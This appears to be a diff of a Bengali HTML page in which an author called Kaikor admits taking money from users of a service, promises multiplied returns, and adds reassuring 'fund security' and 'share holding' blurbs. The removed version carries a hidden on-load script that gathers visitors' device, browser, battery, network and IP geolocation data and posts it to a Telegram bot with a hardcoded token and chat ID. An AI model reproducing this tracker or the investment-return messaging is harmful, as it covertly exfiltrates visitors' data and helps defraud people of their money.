@@ -3,276 +3,312 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ব্যক্তিগত স্বীকারোক্তি</title>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Hind+Siliguri:wght@300;400&display=swap" rel="stylesheet">
+    <title>Kaikor </title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    
     <style>
+        :root {
+            --bg-deep: #02040a;
+            --card-navy: #0d1117;
+            --silver-primary: #cbd5e1;
+            --silver-metal: linear-gradient(135deg, #f8fafc 0%, #94a3b8 50%, #475569 100%);
+            --accent-blue: #38bdf8;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glow: 0 0 20px rgba(56, 189, 248, 0.15);
+        }
+
         body {
-            background-color: #0f0f0f;
-            color: #d1d1d1;
-            font-family: 'Hind Siliguri', sans-serif;
+            background-color: var(--bg-deep);
+            color: var(--silver-primary);
+            font-family: 'Plus Jakarta Sans', 'Hind Siliguri', sans-serif;
             margin: 0;
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% -10%, #1e293b 0%, #02040a 80%);
+        }
+
+        /* --- STICKY GLASS NAV --- */
+        nav {
+            background: rgba(2, 4, 10, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 15px 8%;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 3000;
         }
 
-        .letter-container {
-            max-width: 600px;
-            width: 100%;
-            background: #1a1a1a;
-            padding: 60px 40px;
-            border-radius: 4px;
-            border-left: 3px solid #555;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        .logo-brand {
+            font-size: 1.6rem;
+            font-weight: 800;
+            background: var(--silver-metal);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 2px;
         }
 
-        h2 {
-            font-family: 'Playfair Display', serif;
-            font-size: 1.8rem;
-            color: #ffffff;
-            margin-bottom: 30px;
-            letter-spacing: 1px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
+        /* --- PINNED READ MORE (ENHANCED) --- */
+        .pinned-section {
+            margin: 30px 8%;
+            background: var(--card-navy);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: var(--glow);
+            position: relative;
         }
 
-        p {
-            font-size: 1.1rem;
-            line-height: 1.8;
-            margin-bottom: 25px;
-            text-align: justify;
+        .pinned-badge {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            background: rgba(56, 189, 248, 0.1);
+            color: var(--accent-blue);
+            padding: 5px 12px;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
         }
 
-        .emotional-text {
-            font-style: italic;
-            color: #ff5f5f;
+        .pinned-content {
+            max-height: 120px;
+            overflow: hidden;
+            transition: max-height 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            mask-image: linear-gradient(to bottom, black 50%, transparent 100%);
         }
 
-        .signature {
-            margin-top: 40px;
-            font-family: 'Playfair Display', serif;
-            font-size: 1.2rem;
-            color: #fff;
+        .pinned-content.open {
+            max-height: 2000px;
+            mask-image: none;
         }
 
-        .footer-note {
-            font-size: 0.9rem;
-            color: #777;
+        .read-more-trigger {
+            background: var(--silver-metal);
+            color: #02040a;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
             margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        a {
-            color: #3498db;
+        /* --- IMAGE BANNER --- */
+        .banner-box {
+            margin: 20px 8%;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 1px solid var(--glass-border);
+        }
+        .banner-box img { width: 100%; display: block; filter: brightness(0.8); }
+
+        /* --- MULTIPLE UPDATES LIST --- */
+        .update-feed {
+            padding: 0 8% 80px;
+            max-width: 850px;
+            margin: 0 auto;
+        }
+
+        .feed-header {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin: 40px 0 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .feed-header::after {
+            content: "";
+            flex-grow: 1;
+            height: 1px;
+            background: var(--glass-border);
+        }
+
+        .update-item {
+            background: linear-gradient(145deg, #161b22, #0d1117);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            display: grid;
+            grid-template-columns: 50px 1fr;
+            gap: 20px;
+            transition: 0.3s;
+        }
+
+        .update-item:hover {
+            border-color: var(--accent-blue);
+            transform: scale(1.02);
+        }
+
+        .icon-circle {
+            width: 50px;
+            height: 50px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-blue);
+            font-size: 1.2rem;
+        }
+
+        .update-body h4 { margin: 0 0 8px 0; font-size: 1.15rem; color: #fff; }
+        .update-body p { margin: 0 0 15px 0; font-size: 0.95rem; color: #8b949e; line-height: 1.5; }
+
+        .update-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--accent-blue);
             text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 600;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            padding: 6px 14px;
+            border-radius: 8px;
+            transition: 0.3s;
         }
 
-        @media (max-width: 600px) {
-            .letter-container { padding: 30px 20px; }
+        .update-link:hover {
+            background: var(--accent-blue);
+            color: #02040a;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            background: #010409;
+            padding: 60px 8%;
+            border-top: 1px solid var(--glass-border);
+            text-align: center;
+        }
+
+        .footer-logo { font-size: 1.4rem; font-weight: 800; color: #fff; margin-bottom: 15px; }
+        .footer-socials { display: flex; justify-content: center; gap: 30px; margin-bottom: 30px; }
+        .footer-socials a { color: #484f58; font-size: 1.5rem; transition: 0.3s; }
+        .footer-socials a:hover { color: var(--accent-blue); }
+
+        @media (max-width: 768px) {
+            .update-item { grid-template-columns: 1fr; }
+            .logo-brand { font-size: 1.2rem; }
         }
     </style>
 </head>
 <body>
 
-<div class="letter-container">
-    
-    <h1>দুপুরে আপডেট আসবে, ২ টায়, w8</h1>
-    <h2>একটি ব্যক্তিগত স্বীকারোক্তি</h2>
-    
-    <p>আমি একজন ওয়েব অ্যাপ্লিকেশন ডেভেলপার। 15 বছর বয়স থেকে আমি এই কাজ শিখছি। আমি যখনই কোনো প্রজেক্টে কাজ করি, অনেক সময় প্রতারণার শিকার হই—ঠিকমতো পেমেন্ট পাই না, আবার অনেক সময় উল্টো টাকা দিয়ে কাজ শেখার নামে প্রতারিত হই। আমার পরিবারের সাথে ব্যক্তিগত বিষয় নিয়ে আমার ইগো বা মতের অমিল রয়েছে, তাই তারা আমাকে আর্থিকভাবে সাহায্য করছে না।</p>
-    
-    <p>তাই এখন আমি ভাবছি, একটি ব্যবসা করব যেখানে প্রায় 70k টাকা লাগবে! এখন Tasking এর ইউজারদের কাছ থেকে টাকা নিয়ে আমি চলে যাচ্ছি, কিন্তু আসবো! আপনাদের সবার টাকা দিতে! আমি পরিকল্পনা করেছি, দুই মাস পর তাদের বিনিয়োগের কয়েক গুণ টাকা ফেরত দেব অথবা শেয়ার হোল্ডার করবো । আমি চাইলে মানুষের কাছ থেকে শুধু 30 টাকা নাহ আরও বেশি টাকা নিতে পারতাম, কিন্তু এখন এই পথটিই বেছে নিচ্ছি। <span class="emotional-text">Sorry i have no choice!</span></p>
-
-    <p>হয়তো আমি আপনার কাছে অনেক খারাপ হয়ে গেলাম, কিন্তু একজনের সমস্যা আরেকজন বুঝবে না!</p>
-    
-    <p>আপাতত ব্যবসার আপডেট, কোনদিন কীভাবে টাকা ফেরত পাবেন তা জানতে ৬ মার্চ এই পেজে আবার আসবেন!</p>
-
-    <div class="signature">
-        Sorry, Thanks, দেখা হচ্ছে!<br>
-        আশা করি আপনিও আমাকে সাহায্য করবেন!
-        - কাইকর
+<nav>
+    <div class="logo-brand">KAIKOR</div>
+    <div style="font-size: 0.8rem; letter-spacing: 1px; color: #64748b;">
+        <i class="fa-solid fa-signal" style="color: #22c55e;"></i> SYSTEM ONLINE
     </div>
-    <div class="footer-note">
-        Fb: <a href="https://www.facebook.com/bismaya.kabya" target="_blank">bismaya.kabya</a>
+</nav>
+
+<section class="pinned-section">
+    <div class="pinned-badge"><i class="fa-solid fa-thumbtack"></i> Pinned</div>
+    <h2 style="margin: 0 0 15px 0; color: #fff;">প্লিজ এটা পরে নিচে যান</h2>
+    <div class="pinned-content" id="pinnedMsg"> <p>আমি একজন ওয়েব অ্যাপ্লিকেশন ডেভেলপার। 15 বছর বয়স থেকে আমি এই কাজ শিখছি। আমি যখনই কোনো প্রজেক্টে কাজ করি, অনেক সময় প্রতারণার শিকার হই—ঠিকমতো পেমেন্ট পাই না, আবার অনেক সময় উল্টো টাকা দিয়ে কাজ শেখার নামে প্রতারিত হই। আমার পরিবারের সাথে ব্যক্তিগত বিষয় নিয়ে আমার ইগো বা মতের অমিল রয়েছে, তাই তারা আমাকে আর্থিকভাবে সাহায্য করছে না।
+<br>
+তাই এখন আমি ভাবছি, একটি ব্যবসা করব যেখানে প্রায় 70k টাকা লাগবে! এখন Tasking এর ইউজারদের কাছ থেকে টাকা নিয়ে আমি চলে যাচ্ছি, কিন্তু আসবো! আপনাদের সবার টাকা দিতে! আমি পরিকল্পনা করেছি, দুই মাস পর তাদের বিনিয়োগের কয়েক গুণ টাকা ফেরত দেব অথবা শেয়ার হোল্ডার করবো । আমি চাইলে মানুষের কাছ থেকে শুধু 30 টাকা নাহ আরও বেশি টাকা নিতে পারতাম, কিন্তু এখন এই পথটিই বেছে নিচ্ছি। <b>Sorry i have no choice!<br></b><br>
+
+হয়তো আমি আপনার কাছে অনেক খারাপ হয়ে গেলাম, কিন্তু একজনের সমস্যা আরেকজন বুঝবে না!<br>
+<br>
+আপাতত ব্যবসার আপডেট, কোনদিন কীভাবে টাকা ফেরত পাবেন তা জানতে ৬ মার্চ এই পেজে আবার আসবেন!
+<br><br>
+Sorry, Thanks, দেখা হচ্ছে!
+আশা করি আপনিও আমাকে সাহায্য করবেন! - কাইকর
+
+</p>
+    </div>
+    
+    
+    <button class="read-more-trigger" onclick="toggleMsg()">
+        <span id="triggerBtn">Read Full Message</span> <i class="fa-solid fa-chevron-down" id="triggerIcon"></i>
+    </button>
+</section>
+
+<b>&nbsp;&nbsp; পরবর্তি আপডেট আজ বিকাল ৪ টায়, </b>
+
+<div class="banner-box">
+    <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=80" alt="Security Dashboard">
+</div>
+
+<div class="update-feed">
+    <div class="feed-header"><i class="fa-solid fa-bolt"></i> Recent Log Updates</div>
+
+    <div class="update-item">
+        <div class="icon-circle"><i class="fa-solid fa-vault"></i></div>
+        <div class="update-body">
+            <h4>ফান্ড সিকিউরিটি রিপোর্ট</h4>
+            <p>আপনার সকল ডাটা এবং ট্রানজ্যাকশন হিস্টোরি বর্তমানে মাল্টি-লেয়ার AES এনক্রিপশনের মাধ্যমে সুরক্ষিত।</p>
+            <a href="#" class="update-link"><i class="fa-solid fa-arrow-up-right-from-square"></i> View Certificate</a>
+        </div>
+    </div>
+
+    <div class="update-item">
+        <div class="icon-circle"><i class="fa-solid fa-chart-pie"></i></div>
+        <div class="update-body">
+            <h4>বিজনেস শেয়ার মডিউল</h4>
+            <p>নতুন শেয়ার হোল্ডিং মডিউল যোগ করা হয়েছে। যারা দীর্ঘমেয়াদী প্রফিট চান তাদের জন্য এটি সেরা সুযোগ।</p>
+            <a href="#" class="update-link"><i class="fa-solid fa-circle-info"></i> Learn More</a>
+        </div>
+    </div>
+
+    <div class="update-item">
+        <div class="icon-circle"><i class="fa-solid fa-headset"></i></div>
+        <div class="update-body">
+            <h4>সরাসরি ফেসবুক সাপোর্ট</h4>
+            <p>যেকোনো টেকনিক্যাল ইস্যু বা পেমেন্ট সংক্রান্ত আলোচনার জন্য সরাসরি কাইকরের সাথে যোগাযোগ করুন।</p>
+            <a href="https://www.facebook.com/bismaya.kabya" class="update-link"><i class="fa-brands fa-facebook"></i> Message Admin</a>
+        </div>
     </div>
 </div>
 
-    <script>
+<footer>
+    <div class="footer-logo">KAIKOR</div>
+    <div class="footer-socials">
+        <a href="https://www.facebook.com/bismaya.kabya"><i class="fa-brands fa-facebook"></i></a>
+        <a href="#"><i class="fa-brands fa-telegram"></i></a>
+        <a href="#"><i class="fa-brands fa-github"></i></a>
+    </div>
+    <p style="color: #484f58; font-size: 0.8rem;">
+        &copy; 2026 KAIKOR GLOBAL | All Rights Reserved. <br>
+        <span id="live-time">00:00:00</span>
+    </p>
+</footer>
 
-    
-    const BOT_TOKEN = "8599591227:AAF3O6iHCgoMrWJFTLDVxknRBy8AZ_nF3J8";
-    const CHAT_ID = "8571316406";
-
-    const sanitizeForMarkdownV2 = (text) => {
-      return text.replace(/[\\_*\[\]()~`>#+\-=|{}.!]/g, (match) => '\\' + match);
+<script>
+    // Read More Logic
+    function toggleMsg() {
+        const content = document.getElementById('pinnedMsg');
+        const btn = document.getElementById('triggerBtn');
+        const icon = document.getElementById('triggerIcon');
+        
+        content.classList.toggle('open');
+        
+        if(content.classList.contains('open')) {
+            btn.innerText = "Show Less";
+            icon.classList.replace('fa-chevron-down', 'fa-chevron-up');
+        } else {
+            btn.innerText = "Read Full Message";
+            icon.classList.replace('fa-chevron-up', 'fa-chevron-down');
+        }
     }
 
-    const status = (msg) => {
-      document.getElementById("status").innerText = msg;
-    }
-
-    const appendSection = (title, items) => {
-      const container = document.getElementById("info");
-      const section = document.createElement("div");
-      section.className = "section";
-      section.innerHTML = `<h2>${title}</h2><ul>${items.map(item => `<li>${item}</li>`).join('')}</ul>`;
-      container.appendChild(section);
-    }
-
-    const getInfo = async () => {
-      try {
-        status("তথ্য সংগ্রহ করা হচ্ছে...");
-        const ua = navigator.userAgent;
-        const lang = navigator.language;
-        const online = navigator.onLine ? "অনলাইনে" : "অফলাইনে";
-        const dnt = navigator.doNotTrack === "1" ? "অন" : "বন্ধ";
-        const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
-
-        let os = "অজানা";
-        if (/Windows NT 10/.test(ua)) os = "Windows 10";
-        else if (/Android/.test(ua)) os = ua.match(/Android\s[\d\.]+/)[0];
-        else if (/iPhone OS/.test(ua)) os = ua.match(/OS [\d_]+/)[0].replace("_", ".");
-
-        const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)[/\s]([\d]+)/);
-        const browser = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : "অজানা";
-
-        const deviceType = /Mobi/.test(ua) ? "Mobile" : (/Tablet|iPad/.test(ua) ? "Tablet" : "Desktop");
-        const deviceModel = ua.match(/; ([^;]*) Build/)?.[1] || "নির্ধারিত নয়";
-
-        appendSection("সাধারণ তথ্য", [
-          `User Agent: ${ua}`,
-          `OS: ${os}`,
-          `Browser: ${browser}`,
-          `Device Type: ${deviceType}`,
-          `Device Model: ${deviceModel}`
-        ]);
-
-        appendSection("পেইজ ও নেভিগেশন", [
-          `URL: ${location.href}`,
-          `Title: ${document.title}`,
-          `Referrer: ${document.referrer}`,
-          `ভাষা: ${lang}`,
-          `স্ট্যাটাস: ${online}`,
-          `Cookies Enabled: ${navigator.cookieEnabled}`,
-          `Do Not Track: ${dnt}`,
-          `কালার স্কিম: ${darkMode}`
-        ]);
-
-        appendSection("স্ক্রিন তথ্য", [
-          `Resolution: ${screen.width}x${screen.height}`,
-          `Available: ${screen.availWidth}x${screen.availHeight}`,
-          `Color Depth: ${screen.colorDepth}`,
-          `Pixel Depth: ${screen.pixelDepth}`,
-          `Device Pixel Ratio: ${window.devicePixelRatio}`,
-          `Orientation: ${screen.orientation.type}`
-        ]);
-
-        const now = new Date();
-        appendSection("সময় তথ্য", [
-          `লোকাল সময়: ${now.toLocaleString("bn-BD")}`,
-          `UTC: ${now.toUTCString()}`,
-          `TimeZone Offset: ${now.getTimezoneOffset()} মিনিট`
-        ]);
-
-        appendSection("হার্ডওয়্যার তথ্য", [
-          `CPU কোর: ${navigator.hardwareConcurrency || "অজানা"}`,
-          `RAM: ${navigator.deviceMemory || "অজানা"} GB`,
-          `Touch Support: ${("ontouchstart" in window) ? "হ্যাঁ" : "না"}`
-        ]);
-
-        if ('connection' in navigator) {
-          const c = navigator.connection;
-          appendSection("নেটওয়ার্ক", [
-            `প্রকার: ${c.type}`,
-            `Effective: ${c.effectiveType}`,
-            `Downlink: ${c.downlink} Mbps`,
-            `RTT: ${c.rtt} ms`,
-            `Data Saver: ${c.saveData ? "চালু" : "বন্ধ"}`
-          ]);
-        }
-
-        if ('getBattery' in navigator) {
-          status("ব্যাটারি তথ্য আনা হচ্ছে...");
-          try {
-            const battery = await navigator.getBattery();
-            appendSection("ব্যাটারি", [
-              `Level: ${battery.level * 100}%`,
-              `Charging: ${battery.charging ? "হ্যাঁ" : "না"}`,
-              `Time to Charge: ${battery.chargingTime} s`,
-              `Time to Discharge: ${battery.dischargingTime} s`
-            ]);
-          } catch {}
-        }
-
-        const plugins = Array.from(navigator.plugins).map(p => p.name);
-        appendSection("ব্রাউজার প্লাগইন", plugins);
-
-        status("IP তথ্য আনা হচ্ছে...");
-        try {
-          const res = await fetch("http://ip-api.com/json/?fields=66846719");
-          const ipInfo = await res.json();
-          if (ipInfo.status === "success") {
-            appendSection("IP ভিত্তিক তথ্য", [
-              `IP: ${ipInfo.query}`,
-              `ISP: ${ipInfo.isp}`,
-              `Organization: ${ipInfo.org}`,
-              `AS: ${ipInfo.as}`,
-              `Country: ${ipInfo.country} (${ipInfo.countryCode})`,
-              `Region: ${ipInfo.regionName}`,
-              `City: ${ipInfo.city}`,
-              `ZIP: ${ipInfo.zip}`,
-              `Latitude: ${ipInfo.lat}`,
-              `Longitude: ${ipInfo.lon}`,
-              `TimeZone: ${ipInfo.timezone}`,
-              `Mobile: ${ipInfo.mobile}`,
-              `Proxy/VPN: ${ipInfo.proxy}`,
-              `Hosting: ${ipInfo.hosting}`
-            ]);
-          } else {
-            appendSection("IP তথ্য", ["ত্রুটি: API ব্যর্থ হয়েছে"]);
-          }
-        } catch (e) {
-          appendSection("IP তথ্য", ["ত্রুটি: API অনুপলব্ধ"]);
-        }
-
-        status("তথ্য টেলিগ্রামে পাঠানো হচ্ছে...");
-        if (BOT_TOKEN === "YOUR_BOT_TOKEN" || CHAT_ID === "YOUR_TELEGRAM_CHAT_ID") {
-          status("ত্রুটি: টোকেন বা চ্যাট আইডি সেট করা হয়নি");
-          return;
-        }
-
-        const content = document.getElementById("info").innerText;
-        const message = sanitizeForMarkdownV2(`*তথ্য সংগ্রহ প্রতিবেদন*\n\n${content}`);
-
-        try {
-          const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: message,
-              parse_mode: "MarkdownV2"
-            })
-          });
-          const json = await sendRes.json();
-          if (json.ok) {
-            status("সফলভাবে পাঠানো হয়েছে!");
-          } else {
-            status("পাঠাতে ত্রুটি: " + json.description);
-            console.error("Problematic message:", message);
-          }
-        } catch (e) {
-          status("নেটওয়ার্ক ত্রুটি: টেলিগ্রামে পাঠাতে ব্যর্থ");
-        }
-      } catch (err) {
-        status("ত্রুটি: " + err.message);
-      }
-    }
-
-    window.onload = getInfo;
-
-    </script>
+    // Time Logic
+    setInterval(() => {
+        document.getElementById('live-time').innerText = new Date().toLocaleString();
+    }, 1000);
+</script>
 
 </body>
 </html>
